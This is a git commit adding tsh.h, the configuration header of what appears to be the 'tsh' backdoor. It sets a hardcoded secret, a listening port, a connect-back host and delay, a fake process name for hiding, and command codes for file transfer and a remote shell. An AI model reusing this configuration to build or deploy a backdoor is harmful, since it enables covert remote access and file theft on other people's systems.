621460d5652a3497b2ad6e2b8e41d35120b56f04
admin <admin@localhost>
2017-12-19 17:13:07 +0800

    code

---
+++ tsh.h
@@ -0,0 +1,17 @@
+#ifndef _TSH_H
+#define _TSH_H
+
+char *secret = "sdjiofsjdiojoisdfjoi";
+
+#define SERVER_PORT 8090
+
+#define CONNECT_BACK_HOST  "127.0.0.1"
+#define CONNECT_BACK_DELAY 30
+
+#define FAKE_PROC_NAME "/bin/lla"
+
+#define GET_FILE 1
+#define PUT_FILE 2
+#define RUNSHELL 3
+
+#endif /* tsh.h */
